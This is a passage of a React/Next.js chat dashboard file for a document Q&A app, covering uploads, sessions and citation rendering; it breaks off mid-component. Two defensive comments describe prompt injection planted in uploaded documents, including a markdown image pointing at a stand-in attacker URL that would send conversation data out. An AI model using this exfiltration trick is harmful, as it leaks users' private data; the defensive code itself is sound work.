"use client";

import React, { useState, useRef, useEffect, useCallback } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { useRouter, useSearchParams, usePathname } from 'next/navigation';
import {
  MessageSquare, Plus, FileText, Send, Paperclip,
  Loader2, AlertCircle, RefreshCw, Pencil, Trash2, FolderOpen,
  PanelLeftClose, PanelRightClose, History, BookOpen, Link2,
} from 'lucide-react';
import { apiFetch } from '@/lib/api';
import { useLocalStorage } from '@/lib/useClientState';
import { LogoMark } from '@/components/brand/Logo';
import { Dialog, ConfirmDialog, buttonStyles } from '@/components/ui/Dialog';
import { ToastContainer, Toast } from '@/components/chat/ToastContainer';
import { KnowledgeBaseView, DocumentRecord, PENDING_DOCUMENT_PREFIX } from '@/components/chat/KnowledgeBaseView';
import UploadProgressModal, { UploadFileItem } from '@/components/chat/UploadProgressModal';

// ── Types ──

interface Citation {
  evidence_id?: string;
  document_id?: string;
  filename: string;
  chunk_index?: number;
  page_start?: number;
  page_end?: number;
  section_title?: string;
  content: string;
}

interface ChatMessage {
  role: 'user' | 'ai';
  content: string;
  citations?: Citation[];
  closest_matches?: Citation[];
  error?: boolean;
}

interface ChatSession {
  id: string;
  title: string;
  created_at?: string;
}

interface ChatResponse {
  answer: string;
  citations?: Citation[];
  closest_matches?: Citation[];
}

/** Upload row plus the ids of same-named, already-indexed documents that must not count as this upload finishing. */
type TrackedUpload = UploadFileItem & { ignoreIds: string[] };

interface PanelPrefs {
  historyOpen: boolean;
  sourceOpen: boolean;
  historyWidth: number;
  sourceWidth: number;
}

const DEFAULT_PANELS: PanelPrefs = { historyOpen: true, sourceOpen: false, historyWidth: 256, sourceWidth: 420 };
const SUPPORTED_EXTENSIONS = new Set(['pdf', 'txt', 'docx', 'csv', 'xlsx']);
const MAX_UPLOAD_BYTES = 25 * 1024 * 1024;
const MAX_INPUT_HEIGHT = 200;

const isDesktop = () => window.matchMedia('(min-width: 768px)').matches;
const errorText = (err: unknown, fallback: string) => (err instanceof Error && err.message ? err.message : fallback);
const isReady = (doc: DocumentRecord) => doc.status === 'completed' || doc.status === 'indexed';

// react-markdown passes its syntax-tree `node` to custom components; keep it off DOM elements.
function domProps<P extends { node?: unknown }>(props: P): Omit<P, 'node'> {
  const { node, ...rest } = props;
  void node;
  return rest;
}

// Answers are structured markdown (headings, lists, tables). Tailwind's reset strips list
// markers and heading sizes and no typography plugin is installed, so style them here.
const ANSWER_MARKDOWN_STYLES: Components = {
  h1: (props) => <h3 className="text-base font-semibold text-slate-900 mt-4 mb-2 first:mt-0" {...domProps(props)} />,
  h2: (props) => <h3 className="text-base font-semibold text-slate-900 mt-4 mb-2 first:mt-0" {...domProps(props)} />,
  h3: (props) => <h4 className="text-[15px] font-semibold text-slate-900 mt-3 mb-1.5 first:mt-0" {...domProps(props)} />,
  h4: (props) => <h5 className="text-[15px] font-medium text-slate-900 mt-3 mb-1 first:mt-0" {...domProps(props)} />,
  p: (props) => <p className="my-2 first:mt-0 last:mb-0" {...domProps(props)} />,
  ul: (props) => <ul className="list-disc pl-5 my-2 space-y-1" {...domProps(props)} />,
  ol: (props) => <ol className="list-decimal pl-5 my-2 space-y-1" {...domProps(props)} />,
  li: (props) => <li className="pl-1" {...domProps(props)} />,
  strong: (props) => <strong className="font-semibold text-slate-900" {...domProps(props)} />,
  blockquote: (props) => <blockquote className="border-l-2 border-slate-200 pl-3 my-2 text-slate-600" {...domProps(props)} />,
  code: (props) => <code className="rounded bg-slate-100 px-1 py-0.5 font-mono text-[13px]" {...domProps(props)} />,
  // Wide comparison tables scroll inside the message instead of widening the page.
  table: (props) => (
    <div className="my-3 overflow-x-auto">
      <table className="w-full border-collapse text-sm" {...domProps(props)} />
    </div>
  ),
  thead: (props) => <thead className="bg-slate-50" {...domProps(props)} />,
  th: (props) => <th className="border border-slate-200 px-3 py-2 text-left font-semibold text-slate-900 align-top" {...domProps(props)} />,
  td: (props) => <td className="border border-slate-200 px-3 py-2 align-top" {...domProps(props)} />,
};

const citationLabel = (c: Citation) => {
  let label = c.filename;
  if (c.page_start) label += ` • p.${c.page_start}${c.page_end && c.page_end !== c.page_start ? `–${c.page_end}` : ''}`;
  if (c.section_title) label += `, ${c.section_title}`;
  return label;
};

const citationKey = (c: Citation) => c.evidence_id || c.filename;

/** Turns [E1] / 【1】 markers into #cite-N links that render as citation buttons. */
function linkCitationMarkers(content: string, citations?: Citation[]) {
  return content.replace(/(?:\[|【)(E?\d+)(?:\]|】)/g, (match, p1: string) => {
    if (!citations) return match;
    const searchId = p1.startsWith('E') ? p1 : `E${p1}`;
    let idx = citations.findIndex(c => c.evidence_id === searchId);
    if (idx === -1) {
      const num = parseInt(p1.replace('E', ''));
      if (!isNaN(num) && num > 0 && num <= citations.length) idx = num - 1;
    }
    if (idx !== -1) return `[${match}](#cite-${idx})`;
    return match;
  });
}

function AnswerMarkdown({ message, onCite }: { message: ChatMessage; onCite: (citations: Citation[], focusIdx: number) => void }) {
  const citations = message.citations;
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={{
        ...ANSWER_MARKDOWN_STYLES,
        a: (allProps) => {
          const props = domProps(allProps);
          if (props.href?.startsWith('#cite-') && citations) {
            const cIdx = parseInt(props.href.replace('#cite-', ''));
            const clicked = citations[cIdx];
            if (clicked) {
              return (
                <button
                  type="button"
                  onClick={() => {
                    const sameSource = citations.filter(orig => citationKey(orig) === citationKey(clicked));
                    const focusIdx = sameSource.findIndex(orig => orig === clicked);
                    onCite(sameSource, focusIdx === -1 ? 0 : focusIdx);
                  }}
                  className="inline-flex items-center justify-center px-1.5 py-0.5 rounded bg-indigo-50 border border-indigo-200 text-indigo-700 hover:bg-indigo-100 font-mono text-[10px] font-bold mx-0.5 align-baseline transition-colors"
                  aria-label={`Source: ${citationLabel(clicked)}`}
                  title={clicked.filename}
                >
                  {props.children}
                </button>
              );
            }
          }
          // Answers can echo text planted in uploaded documents, so links are
          // limited to http(s) and opened without leaking referrer or opener.
          const href = props.href || '';
          if (!/^https?:\/\//i.test(href)) return <span>{props.children}</span>;
          return <a {...props} className="text-indigo-700 underline underline-offset-2" target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer" />;
        },
        // Never fetch remote images: a prompt-injected ![](https://attacker/?q=...)
        // would otherwise send conversation data to a third party on render.
        img: ({ alt }) => (alt ? <span>[image: {alt}]</span> : null),
      }}
    >
      {linkCitationMarkers(message.content, citations)}
    </ReactMarkdown>
  );
}

export default function ChatDashboard({ boxId, boxName }: { boxId: string, boxName: string }) {
  const searchParams = useSearchParams();
  const router = useRouter();
  const pathname = usePathname();
  const currentView = searchParams.get('view') === 'chat' ? 'chat' : 'documents';

  const setCurrentView = (view: 'chat' | 'documents') => {
    const params = new URLSearchParams(searchParams.toString());
    if (view === 'documents') params.delete('view');
    else params.set('view', view);
    const query = params.toString();
    router.push(query ? `${pathname}?${query}` : pathname);
  };

  const [panels, setPanels] = useLocalStorage<PanelPrefs>('docintel.chat.panels', DEFAULT_PANELS);
  const [mobilePanel, setMobilePanel] = useState<'history' | 'sources' | null>(null);
  const [activeSource, setActiveSource] = useState<{ citations: Citation[], focusIdx: number } | null>(null);
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [inputText, setInputText] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [documents, setDocuments] = useState<DocumentRecord[]>([]);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [recentChats, setRecentChats] = useState<ChatSession[]>([]);
  const [toasts, setToasts] = useState<Toast[]>([]);
  const [uploads, setUploads] = useState<TrackedUpload[]>([]);
  const [showUploadModal, setShowUploadModal] = useState(false);
  const [renameTarget, setRenameTarget] = useState<ChatSession | null>(null);
  const [renameValue, setRenameValue] = useState('');
  const [renameError, setRenameError] = useState<string | null>(null);
  const [renaming, setRenaming] = useState(false);
  const [deleteTarget, setDeleteTarget] = useState<ChatSession | null>(null);

  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const inputRef = useRef<HTMLTextAreaElement>(null);
  const workspaceRef = useRef<HTMLDivElement>(null);
  const resizingRef = useRef<null | 'history' | 'source'>(null);
  // Bumped whenever the visible conversation changes, so late responses for the
  // previous conversation are dropped instead of being shown in the wrong one.
  const conversationToken = useRef(0);

  // Monotonic ids: Date.now() repeats when several toasts fire in the same millisecond.
  const toastSeq = useRef(0);
  const showToast = useCallback((message: string, type: Toast['type']) => {
    const id = ++toastSeq.current;
    setToasts(prev => [...prev, { id, message, type }]);
    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), type === 'success' ? 4000 : 7000);
  }, []);

  const dismissToast = useCallback((id: number) => {
    setToasts(prev => prev.filter(t => t.id !== id));
  }, []);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isProcessing]);

  // ── Drag-to-resize (desktop panels) ──
  useEffect(() => {
    const onMove = (e: MouseEvent) => {
      if (resizingRef.current === 'history') {
        const left = workspaceRef.current?.getBoundingClientRect().left ?? 0;
        const historyWidth = Math.min(420, Math.max(200, e.clientX - left));
        setPanels(p => ({ ...p, historyWidth }));
      } else if (resizingRef.current === 'source') {
        const sourceWidth = Math.min(760, Math.max(300, window.innerWidth - e.clientX));
        setPanels(p => ({ ...p, sourceWidth }));
      }
    };
    const onUp = () => {
      if (resizingRef.current) {
        resizingRef.current = null;
        document.body.style.cursor = '';
        document.body.style.userSelect = '';
      }
    };
    window.addEventListener('mousemove', onMove);
    window.addEventListener('mouseup', onUp);
    return () => { window.removeEventListener('mousemove', onMove); window.removeEventListener('mouseup', onUp); };
  }, [setPanels]);

  const startResize = (e: React.MouseEvent, side: 'history' | 'source') => {
    e.preventDefault();
    resizingRef.current = side;
    document.body.style.cursor = 'col-resize';
    document.body.style.userSelect = 'none';
  };

  const toggleHistory = () => {
    if (isDesktop()) setPanels(p => ({ ...p, historyOpen: !p.historyOpen }));
    else setMobilePanel('history');
  };

  const toggleSources = () => {
    if (isDesktop()) setPanels(p => ({ ...p, sourceOpen: !p.sourceOpen }));
    else setMobilePanel('sources');
  };

  const openCitation = (citations: Citation[], focusIdx: number) => {
    setActiveSource({ citations, focusIdx });
    const desktop = isDesktop();
    if (desktop) setPanels(p => ({ ...p, sourceOpen: true }));
    else setMobilePanel('sources');
    setTimeout(() => {
      document.getElementById(`${desktop ? 'panel' : 'sheet'}-cite-${focusIdx}`)?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 80);
  };

  // ── Data loading ──

  const applyDocuments = useCallback((serverDocs: DocumentRecord[]) => {
    // Keep optimistic rows for uploads the server doesn't list yet (or that failed before reaching it).
    setDocuments(prev => [
      ...prev.filter(d => d.id.startsWith(PENDING_DOCUMENT_PREFIX) && !serverDocs.some(s => s.filename === d.filename)),
      ...serverDocs,
    ]);
  }, []);

  // Background refreshes (polling, after uploads) stay quiet; the first load reports problems.
  const refreshDocuments = useCallback(() => {
    apiFetch<{ data?: DocumentRecord[] }>(`/api/v1/documents/?box_id=${boxId}`)
      .then(data => applyDocuments(data.data ?? []))
      .catch(() => {});
  }, [boxId, applyDocuments]);

  useEffect(() => {
    let cancelled = false;
    apiFetch<{ data?: DocumentRecord[] }>(`/api/v1/documents/?box_id=${boxId}`)
      .then(data => { if (!cancelled) applyDocuments(data.data ?? []); })
      .catch(err => { if (!cancelled) showToast(errorText(err, 'Couldn’t load documents.'), 'error'); });
    return () => { cancelled = true; };
  }, [boxId, applyDocuments, showToast]);

  // Poll while anything is still processing in the background.
  const hasProcessing = documents.some(doc => doc.status === 'processing' && !doc.id.startsWith(PENDING_DOCUMENT_PREFIX));
  useEffect(() => {
    if (!hasProcessing) return;
    const id = window.setInterval(refreshDocuments, 3000);
    return () => window.clearInterval(id);
  }, [hasProcessing, refreshDocuments]);

  useEffect(() => {
    let cancelled = false;
    apiFetch<{ sessions?: ChatSession[] }>(`/api/v1/chat/sessions?box_id=${boxId}`)
      .then(data => { if (!cancelled) setRecentChats(data.sessions ?? []); })
      .catch(err => { if (!cancelled) showToast(errorText(err, 'Couldn’t load conversations.'), 'error'); });
    return () => { cancelled = true; };
  }, [boxId, showToast]);

  // ── Conversations ──

  const startNewChat = () => {
    conversationToken.current++;
    setSessionId(null);
    setMessages([]);
    setActiveSource(null);
    setLoadingHistory(false);
    setIsProcessing(false);
    setMobilePanel(null);
    inputRef.current?.focus();
  };

  const selectSession = async (id: string) => {
    setMobilePanel(null);
    if (id === sessionId) return;
    const token = ++conversationToken.current;
    setSessionId(id);
    setMessages([]);
    setActiveSource(null);
    setIsProcessing(false);
    setLoadingHistory(true);
    try {
      const data = await apiFetch<{ history: { role: string; content: string }[] }>(`/api/v1/chat/sessions/${id}?box_id=${boxId}`);
      if (conversationToken.current !== token) return;
      setMessages(data.history.map(m => ({ role: m.role === 'assistant' ? 'ai' : 'user', content: m.content })));
    } catch (err) {
      if (conversationToken.current === token) showToast(errorText(err, 'Couldn’t load this conversation.'), 'error');
    } finally {
      if (conversationToken.current === token) setLoadingHistory(false);
    }
  };

  const openRename = (chat: ChatSession) => {
    setMobilePanel(null);
    setRenameTarget(chat);
    setRenameValue(chat.title);
    setRenameError(null);
  };

  const submitRename = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!renameTarget) return;
    const title = renameValue.trim();
    if (!title) { setRenameError('Enter a name for this conversation.'); return; }
    if (title === renameTarget.title) { setRenameTarget(null); return; }
    setRenaming(true);
    setRenameError(null);
    try {
      await apiFetch(`/api/v1/chat/sessions/${renameTarget.id}?box_id=${boxId}`, {
        method: 'PATCH',
        body: JSON.stringify({ title }),
      });
      setRecentChats(prev => prev.map(item => item.id === renameTarget.id ? { ...item, title } : item));
      setRenameTarget(null);
    } catch (err) {
      setRenameError(errorText(err, 'Couldn’t rename this conversation.'));
    } finally {
      setRenaming(false);
    }
  };

  const confirmDeleteChat = async () => {
    if (!deleteTarget) return;
    await apiFetch(`/api/v1/chat/sessions/${deleteTarget.id}?box_id=${boxId}`, { method: 'DELETE' });
    setRecentChats(prev => prev.filter(item => item.id !== deleteTarget.id));
    if (sessionId === deleteTarget.id) startNewChat();
    showToast('Conversation deleted', 'success');
  };

  // ── Uploads ──

  const uploadFiles = async (fileList: FileList | File[]) => {
    const files = Array.from(fileList);
    // Reset so choosing the same file again still fires a change event.
    if (fileInputRef.current) fileInputRef.current.value = '';
    if (!files.length || isUploading) return;

    const validFormatFiles = files.filter(file => SUPPORTED_EXTENSIONS.has(file.name.split('.').pop()?.toLowerCase() || ''));
    if (validFormatFiles.length !== files.length) {
      showToast('Only PDF, DOCX, TXT, CSV and XLSX files are supported.', 'warning');
    }
    const validFiles = validFormatFiles.filter(file => file.size <= MAX_UPLOAD_BYTES);
    if (validFiles.length !== validFormatFiles.length) {
      showToast('Files larger than 25 MB were skipped.', 'warning');
    }
    if (!validFiles.length) return;

    const names = new Set(validFiles.map(f => f.name));
    const addedAt = new Date().toISOString();
    setIsUploading(true);
    setUploads(validFiles.map(f => ({
      filename: f.name,
      size: f.size,
      status: 'uploading',
      ignoreIds: documents.filter(d => d.filename === f.name && isReady(d)).map(d => d.id),
    })));
    setShowUploadModal(true);
    setDocuments(prev => [
      ...validFiles
        .filter(file => !prev.some(d => d.filename === file.name))
        .map((file): DocumentRecord => ({ id: `${PENDING_DOCUMENT_PREFIX}${file.name}`, filename: file.name, status: 'processing', created_at: addedAt })),
      // A re-upload of a failed document is retried by the server under the same record.
      ...prev.map(d => names.has(d.filename) && d.status === 'failed' ? { ...d, status: 'processing' as const, error_message: undefined } : d),
    ]);

    await Promise.all(validFiles.map(async file => {
      const update = (patch: Partial<UploadFileItem>) =>
        setUploads(prev => prev.map(item => item.filename === file.name ? { ...item, ...patch } : item));
      const formData = new FormData();
      formData.append('file', file);
      formData.append('box_id', boxId);
      try {
        await apiFetch('/api/v1/upload/box', { method: 'POST', body: formData });
        update({ status: 'processing' });
      } catch (err) {
        const message = errorText(err, 'Upload failed.');
        update({ status: 'failed', message });
        setDocuments(prev => prev.map(d => d.id === `${PENDING_DOCUMENT_PREFIX}${file.name}` ? { ...d, status: 'failed', error_message: message } : d));
      }
    }));

    setIsUploading(false);
    refreshDocuments();
  };

  // Upload rows that the server accepted finish when the document list says so.
  const uploadView: UploadFileItem[] = uploads.map(({ ignoreIds, ...item }) => {
    if (item.status !== 'processing') return item;
    const doc = documents.find(d => d.filename === item.filename && !d.id.startsWith(PENDING_DOCUMENT_PREFIX) && !ignoreIds.includes(d.id));
    if (doc?.status === 'failed') return { ...item, status: 'failed', message: doc.error_message || 'Processing failed.' };
    if (doc && isReady(doc)) return { ...item, status: 'ready' };
    return item;
  });

  const handleDeleteFile = async (documentId: string) => {
    if (!documentId.startsWith(PENDING_DOCUMENT_PREFIX)) {
      await apiFetch(`/api/v1/documents/${documentId}?box_id=${boxId}`, { method: 'DELETE' });
    }
    setDocuments(prev => prev.filter(document => document.id !== documentId));
    showToast('Document deleted', 'success');
  };

  // ── Asking ──

  const handleSendMessage = async (retryContent?: string) => {
    const userQuery = retryContent || inputText.trim();
    if (!userQuery || isProcessing) return;
    const token = conversationToken.current;

    if (!retryContent) {
      setInputText('');
      if (inputRef.current) inputRef.current.style.height = 'auto';
      setMessages(prev => [...prev, { role: 'user', content: userQuery }]);
    }
    setIsProcessing(true);

    const showError = (content: string) => setMessages(prev => [
      ...(retryContent ? prev.filter(m => !m.error) : prev),
      { role: 'ai', content, error: true },
    ]);

    let currentSid = sessionId;
    if (!currentSid) {
      try {
        const title = userQuery.slice(0, 60);
        const data = await apiFetch<{ session_id: string }>('/api/v1/chat/sessions', {
          method: 'POST',
          body: JSON.stringify({ box_id: boxId, title }),
        });
        if (conversationToken.current !== token) return;
        currentSid = data.session_id;
        setSessionId(currentSid);
        setRecentChats(prev => [{ id: data.session_id, title: title || 'New conversation', created_at: new Date().toISOString() }, ...prev]);
      } catch (err) {
        if (conversationToken.current !== token) return;
        showError(errorText(err, 'Couldn’t start a conversation. Please try again.'));
        setIsProcessing(false);
        return;
      }
    }

    try {
      const data = await apiFetch<ChatResponse>('/api/v1/chat/', {
        method: 'POST',
        body: JSON.stringify({ question: userQuery, box_id: boxId, session_id: currentSid }),
      });
      if (conversationToken.current !== token) return;
      setMessages(prev => [
        ...(retryContent ? prev.filter(m => !m.error) : prev),
        { role: 'ai', content: data.answer, citations: data.citations, closest_matches: data.closest_matches },
      ]);
    } catch (err) {
      if (conversationToken.current !== token) return;
      showError(errorText(err, 'I couldn’t reach the server. Please try again.'));
    } finally {
      if (conversationToken.current === token) setIsProcessing(false);
    }
  };

  const resizeInput = () => {
    const el = inputRef.current;
    if (!el) return;
    el.style.height = 'auto';
    el.style.height = `${Math.min(el.scrollHeight, MAX_INPUT_HEIGHT)}px`;
  };

  const readyCount = documents.filter(isReady).length;

  // ── Panel content (shared by the desktop sidebars and the mobile sheets) ──

  const renderHistoryList = () => (
    recentChats.length === 0 ? (
      <p className="text-xs text-slate-500 text-center mt-6">No conversations yet</p>
    ) : (
      <ul className="space-y-1">
        {recentChats.map(chat => {
          const active = sessionId === chat.id;
          return (
            <li key={chat.id} className={`group relative rounded-lg border transition-colors ${active ? 'bg-indigo-50/80 border-indigo-100' : 'border-transparent hover:bg-white hover:border-slate-200'}`}>
              <button
                type="button"
                onClick={() => selectSession(chat.id)}
                aria-current={active ? 'true' : undefined}
                className="w-full text-left p-2.5 pr-16 rounded-lg"
              >
                <span className={`block text-xs truncate ${active ? 'font-semibold text-indigo-900' : 'font-medium text-slate-900'}`}>{chat.title}</span>
                <span className={`block text-[11px] mt-0.5 ${active ? 'text-indigo-700' : 'text-slate-500'}`}>
                  {chat.created_at ? new Date(chat.created_at).toLocaleDateString(undefined, { month: 'short', day: 'numeric' }) : ' '}
                </span>
              </button>
              <div className="absolute right-1.5 top-1/2 -translate-y-1/2 flex items-center gap-0.5 opacity-0 group-hover:opacity-100 focus-within:opacity-100 [@media(hover:none)]:opacity-100 transition-opacity">
                <button type="button" onClick={() => openRename(chat)} className="p-1.5 rounded text-slate-500 hover:text-indigo-600 hover:bg-white" aria-label={`Rename “${chat.title}”`}>
                  <Pencil size={13} aria-hidden="true" />
                </button>
                <button type="button" onClick={() => { setMobilePanel(null); setDeleteTarget(chat); }} className="p-1.5 rounded text-slate-500 hover:text-red-600 hover:bg-white" aria-label={`Delete “${chat.title}”`}>
                  <Trash2 size={13} aria-hidden="true" />
                </button>
              </div>
            </li>
          );
        })}
      </ul>
    )
  );

  const renderSources = (idPrefix: 'panel' | 'sheet') => (
    !activeSource ? (
      <div className="text-center text-slate-500 text-sm pt-12 space-y-2">
        <BookOpen className="w-8 h-8 mx-auto opacity-40" aria-hidden="true" />
        <p>Select a citation in an answer to see the passage it came from.</p>
      </div>
    ) : (
      <ul className="space-y-3">
        {activeSource.citations.map((c, i) => {
          const focused = i === activeSource.focusIdx;
          return (
            <li key={i}>
              <button
                type="button"
                id={`${idPrefix}-cite-${i}`}
                onClick={() => setActiveSource({ ...activeSource, focusIdx: i })}
                aria-current={focused ? 'true' : undefined}
                className={`block w-full text-left p-3.5 rounded-lg border transition-colors ${focused ? 'border-indigo-200 bg-indigo-50/50 ring-1 ring-indigo-200/50' : 'border-slate-200 bg-slate-50/70 hover:border-slate-300'}`}
              >
                <span className={`block mb-1.5 font-semibold text-[11px] truncate ${focused ? 'text-indigo-700' : 'text-slate-700'}`}>
                  [{c.evidence_id || `E${i + 1}`}] {c.section_title || c.filename}{c.page_start ? ` · p.${c.page_start}` : ''}
                </span>
                <span className="block font-mono text-xs text-slate-900 leading-relaxed whitespace-pre-wrap select-text">{c.content}</span>
              </button>
            </li>
          );
        })}
      </ul>
    )
  );

  const sourceTitle = activeSource ? activeSource.citations[activeSource.focusIdx]?.filename ?? 'Sources' : 'Sources';

  return (
    <div className="flex-1 min-h-0 flex bg-white text-slate-900 overflow-hidden relative">
      <ToastContainer toasts={toasts} onDismiss={dismissToast} />

      <input
        type="file"
        ref={fileInputRef}
        onChange={e => uploadFiles(e.target.files || [])}
        className="hidden"
        accept=".pdf,.txt,.docx,.csv,.xlsx"
        multiple
        tabIndex={-1}
        aria-hidden="true"
      />

      <UploadProgressModal
        isOpen={showUploadModal}
        boxName={boxName}
        files={uploadView}
        onClose={() => setShowUploadModal(false)}
      />

      {currentView === 'documents' && (
        <KnowledgeBaseView
          boxName={boxName}
          documents={documents}
          isUploading={isUploading}
          onUploadClick={() => fileInputRef.current?.click()}
          onDeleteFile={handleDeleteFile}
          onFilesSelected={uploadFiles}
          onOpenChat={() => setCurrentView('chat')}
        />
      )}

      {currentView === 'chat' && (
        <div className="flex-1 flex flex-col min-h-0 min-w-0 bg-white">
          <header className="h-14 border-b border-slate-200 bg-white px-3 sm:px-4 md:px-6 flex items-center justify-between gap-3 shrink-0 z-20">
            <div className="flex items-center gap-3 min-w-0">
              <FolderOpen className="text-slate-400 w-5 h-5 shrink-0" aria-hidden="true" />
              <h1 className="text-sm font-semibold text-slate-900 truncate tracking-tight font-headline">{boxName}</h1>
              <span className="hidden sm:inline-flex shrink-0 items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-slate-50 text-xs font-medium text-slate-600 border border-slate-200">
                {readyCount} document{readyCount === 1 ? '' : 's'} ready
              </span>
            </div>
            <div className="flex items-center gap-1.5 sm:gap-2 shrink-0">
              <button
                type="button"
                onClick={toggleHistory}
                aria-pressed={panels.historyOpen}
                aria-label="Conversation history"
                className={`flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium transition-colors ${panels.historyOpen ? 'md:bg-slate-100 md:text-slate-900' : ''} text-slate-600 hover:bg-slate-50 hover:text-slate-900`}
              >
                <History className="w-3.5 h-3.5" aria-hidden="true" />
                <span className="hidden sm:inline">History</span>
              </button>
              <button
                type="button"
                onClick={() => setCurrentView('documents')}
                aria-label="Documents"
                className="flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium text-slate-600 hover:text-slate-900 hover:bg-slate-50 transition-colors"
              >
                <FileText className="w-3.5 h-3.5" aria-hidden="true" />
                <span className="hidden sm:inline">Documents</span>
              </button>
              <button
                type="button"
                onClick={toggleSources}
                aria-pressed={panels.sourceOpen}
                aria-label="Sources"
                className={`relative flex items-center gap-1.5 px-2.5 sm:px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-medium transition-colors ${panels.sourceOpen ? 'md:bg-slate-100 md:text-slate-900' : ''} text-slate-600 hover:bg-slate-50 hover:text-slate-900`}
              >
                <BookOpen className="w-3.5 h-3.5" aria-hidden="true" />
                <span className="hidden sm:inline">Sources</span>
                {activeSource && <span className="md:hidden absolute -top-1 -right-1 w-2 h-2 rounded-full bg-indigo-600" aria-hidden="true" />}
              </button>
            </div>
          </header>

          <div ref={workspaceRef} className="flex-1 flex min-h-0 overflow-hidden relative">
            {/* ── Conversation history (desktop) ── */}
            {panels.historyOpen ? (
              <aside aria-label="Conversation history" style={{ width: panels.historyWidth }} className="relative shrink-0 border-r border-slate-200 bg-slate-50/50 hidden md:flex flex-col min-h-0">
                <div className="h-12 px-4 border-b border-slate-200 flex items-center justify-between shrink-0">
                  <h2 className="flex items-center gap-2 text-xs font-semibold text-slate-900 tracking-tight font-headline">
                    <MessageSquare className="w-4 h-4 text-slate-500" aria-hidden="true" />
                    Conversations
                  </h2>
                  <button type="button" onClick={toggleHistory} className="p-1 rounded text-slate-500 hover:text-slate-700 hover:bg-slate-100 transition-colors" aria-label="Hide conversation history">
                    <PanelLeftClose size={15} aria-hidden="true" />
                  </button>
                </div>
                <div className="p-3 border-b border-slate-200/80">
                  <button type="button" onClick={startNewChat} className="w-full flex items-center justify-center gap-1.5 py-1.5 px-3 rounded-lg bg-white hover:bg-slate-50 border border-slate-200 text-slate-800 text-xs font-medium transition-colors shadow-xs">
                    <Plus size={14} className="text-indigo-600" aria-hidden="true" />
                    New conversation
                  </button>
                </div>
                <div className="flex-1 overflow-y-auto p-2">{renderHistoryList()}</div>
                {/* Mouse-only convenience; keyboard users keep the default width. */}
                <div onMouseDown={e => startResize(e, 'history')} className="absolute top-0 -right-1 w-2 h-full cursor-col-resize z-10 group" aria-hidden="true">
                  <div className="mx-auto w-0.5 h-full bg-transparent group-hover:bg-indigo-400 transition-colors" />
                </div>
              </aside>
            ) : (
              <div className="w-12 shrink-0 border-r border-slate-200 bg-slate-50/50 hidden md:flex flex-col items-center py-3 gap-2">
                <button type="button" onClick={toggleHistory} className="p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" aria-label="Show conversation history">
                  <History size={18} aria-hidden="true" />
                </button>
                <button type="button" onClick={startNewChat} className="p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" aria-label="New conversation">
                  <Plus size={18} aria-hidden="true" />
                </button>
              </div>
            )}

            {/* ── Conversation ── */}
            <section aria-label="Conversation" className="flex-1 flex flex-col min-h-0 min-w-0 bg-white">
              <div className="flex-1 overflow-y-auto px-4 md:px-6 py-6 md:py-8">
                <div className="max-w-3xl mx-auto space-y-8 pb-4">
                  {messages.length === 0 && !loadingHistory && (
                    <div className="flex flex-col items-center justify-center text-center pt-12 md:pt-20 space-y-4">
                      <LogoMark className="w-14 h-14" />
                      <div className="space-y-2">
                        <h2 className="text-lg font-semibold text-slate-900 font-headline">Ask about your documents</h2>
                        <p className="text-sm text-slate-500 max-w-sm">
                          {readyCount > 0
                            ? 'Answers are drawn only from the documents in this box and link to the passages they cite.'
                            : 'This box has no ready documents yet. Upload some first so there is something to answer from.'}
                        </p>
                      </div>
                      {readyCount === 0 && (
                        <button type="button" onClick={() => setCurrentView('documents')} className={buttonStyles.secondary}>
                          <FileText className="w-4 h-4" aria-hidden="true" /> Go to documents
                        </button>
                      )}
                    </div>
                  )}

                  {loadingHistory && (
                    <p className="flex items-center justify-center gap-2 text-sm text-slate-500 pt-12" role="status">
                      <Loader2 className="w-4 h-4 animate-spin" aria-hidden="true" /> Loading conversation…
                    </p>
                  )}

                  {messages.map((msg, idx) => (
                    <article key={idx} className="flex gap-3 sm:gap-4 items-start" aria-label={msg.role === 'user' ? 'Your question' : 'DocIntel answer'}>
                      <div className="w-8 h-8 shrink-0 mt-0.5" aria-hidden="true">
                        {msg.role === 'user' ? (
                          <span className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-[10px] font-semibold text-slate-600">You</span>
                        ) : msg.error ? (
                          <span className="w-8 h-8 rounded-lg bg-red-50 border border-red-200 flex items-center justify-center"><AlertCircle className="w-4 h-4 text-red-500" /></span>
                        ) : (
                          <LogoMark className="w-8 h-8" />
                        )}
                      </div>
                      <div className="flex-1 min-w-0 space-y-3">
                        <p className={`text-xs font-semibold tracking-tight ${msg.role === 'user' ? 'text-slate-500' : 'text-slate-900 font-headline'}`}>
                          {msg.role === 'user' ? 'You' : 'DocIntel'}
                        </p>
                        <div className={`text-[15px] leading-relaxed wrap-break-word ${msg.error ? 'text-red-700' : 'text-slate-800'}`}>
                          {msg.role === 'user'
                            ? <p className="whitespace-pre-wrap">{msg.content}</p>
                            : <AnswerMarkdown message={msg} onCite={openCitation} />}
                        </div>

                        {msg.error && (
                          <button
                            type="button"
                            onClick={() => { const lastUserMsg = messages.slice(0, idx).reverse().find(m => m.role === 'user'); if (lastUserMsg) handleSendMessage(lastUserMsg.content); }}
                            disabled={isProcessing}
